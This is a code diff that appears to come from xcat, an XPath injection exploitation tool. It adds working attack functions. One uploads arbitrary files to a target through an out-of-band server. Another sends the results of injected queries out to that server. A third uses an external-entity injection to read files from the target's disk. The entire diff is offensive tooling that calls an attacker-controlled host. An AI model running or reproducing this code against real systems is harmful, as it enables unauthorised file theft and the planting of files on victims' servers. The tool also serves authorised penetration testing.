@@ -1,6 +1,8 @@
+import base64
 import string as stdlib_string
 import asyncio
 
+from xcat.xpath.fs import write_binary, base_64_binary
 from xcat.xpath.xpath_1 import string_length, substring_before, concat, string, normalize_space
 from xcat.xpath.xpath_2 import string_to_codepoints, doc, encode_for_uri
 from .xpath import xpath_1
@@ -102,19 +104,38 @@ async def get_string(requester: Requester, expression, disable_normalization=Fal
     return result
 
 
+async def upload_file_via_oob(requester: Requester, remote_path, file_bytes: bytes):
+    encoded = base64.encodebytes(file_bytes)
+    server = await requester.get_oob_server()
+    url, future = server.expect_file_download(encoded.decode())
+
+    await requester.check(write_binary(remote_path, base_64_binary(doc(url) / 'data')))
+
+    try:
+        return await asyncio.wait_for(future, timeout=5)
+    except asyncio.TimeoutError:
+        return False
+
+
 async def get_string_via_oob(requester: Requester, expression):
     server = await requester.get_oob_server()
     url, future = server.expect_data()
 
     if not await requester.check(
-                    doc(concat(f'{url}?d=', encode_for_uri(expression))).add_path(
-                        '/data') == server.test_response_value):
+                    doc(concat(f'{url}?d=', encode_for_uri(expression))) / 'data' == server.test_response_value):
         return None
 
     try:
         return await asyncio.wait_for(future, timeout=5)
     except asyncio.TimeoutError:
         return None
+
+
+async def get_file_via_entity_injection(requester: Requester, file_path):
+    server = await requester.get_oob_server()
+    url, future = server.expect_entity_injection(f'SYSTEM "{file_path}"')
+
+    return await get_string_via_oob(requester, doc(url) / 'data')
 
 
 async def iterate_all(requester: Requester, expressions):
